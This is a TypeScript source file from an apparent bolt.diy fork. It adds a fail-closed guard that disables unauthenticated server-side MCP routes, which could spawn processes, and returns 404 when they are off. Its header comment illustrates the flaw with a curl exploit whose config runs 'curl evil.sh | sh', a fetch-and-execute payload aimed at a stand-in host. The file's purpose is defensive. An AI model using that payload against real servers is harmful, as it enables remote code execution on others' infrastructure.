/**
 * The fail-closed guard for upstream bolt.diy's SERVER-SIDE MCP execution (SPEC §4.14, §5).
 *
 * ## The hole this closes
 *
 * Upstream ships `MCPService` (`app/lib/services/mcpService.ts`) with three transports, one of which —
 * stdio — literally **spawns a child process** (`Experimental_StdioMCPTransport` → the `command` +
 * `args` from the config). It is driven by two routes, `POST /api/mcp-update-config` and
 * `GET /api/mcp-check`, and upstream ships them with **no authentication**.
 *
 * Put together, on a deployed Node instance that is:
 *
 *     curl -X POST https://app.example.com/api/mcp-update-config \
 *       -d '{"mcpServers":{"x":{"command":"sh","args":["-c","curl evil.sh | sh"]}}}'
 *
 * — **unauthenticated remote code execution on the platform server.** Worse than the unmetered-LLM
 * holes closed in Stage 3 (§4.5.4): that was our money; this is our infrastructure.
 *
 * ## Why the fix is "off", not "auth + validate"
 *
 * Authenticating the route would only downgrade this to *authenticated* RCE — a verified user could
 * still run `curl … | sh` on our box. SPEC §5 is absolute: **"No server-side execution of user code or
 * skill scripts. Ever."** And §4.14 states the architecture positively: **MCP servers run inside the
 * user's own WebContainer, never on platform infrastructure.** So the server-side execution model is
 * simply not ours to use. This guard turns it OFF by default and keeps it off in production.
 *
 * The flag `SERVER_SIDE_MCP_ENABLED` exists only to let a local developer bisect against upstream's
 * behaviour; like `assertNotLocalInProduction`, enabling it is a conscious, logged act.
 *
 * Hide-don't-delete (SPEC §2.1a): `mcpService.ts` and both routes stay on disk, byte-for-byte, so
 * upstream pulls keep merging. They just refuse to act.
 */
import { envFlag } from '~/lib/.server/env';
import { createScopedLogger } from '~/utils/logger';

const logger = createScopedLogger('mcp-server-guard');

/**
 * Whether server-side MCP execution is permitted. Default FALSE — the safe posture.
 *
 * When true, logs loudly: an operator has opted the server back into spawning processes from
 * client-supplied config, which is never correct for a deployed multi-tenant instance.
 */
export function serverSideMcpEnabled(context?: unknown): boolean {
  const enabled = envFlag(context, 'SERVER_SIDE_MCP_ENABLED');

  if (enabled) {
    logger.warn(
      'SERVER_SIDE_MCP_ENABLED is on — the server will spawn/connect MCP servers from client config. ' +
        'This is an RCE/SSRF surface and must NEVER be set on a deployed instance (SPEC §4.14, §5).',
    );
  }

  return enabled;
}

/**
 * Refuse a server-side MCP route unless explicitly enabled.
 *
 * **404, not 403** — the same reasoning as the LLM guard: a 403 confirms the endpoint exists and is
 * merely switched off, which is a hint to anyone probing for the process-spawn surface. Returns `null`
 * when enabled, so the caller proceeds.
 */
export function serverSideMcpDisabled(context?: unknown, route?: string): Response | null {
  if (serverSideMcpEnabled(context)) {
    return null;
  }

  logger.info(`${route ?? 'A server-side MCP route'} refused — MCP runs in the WebContainer (SPEC §4.14).`);

  return new Response('Not Found', { status: 404, statusText: 'Not Found' });
}
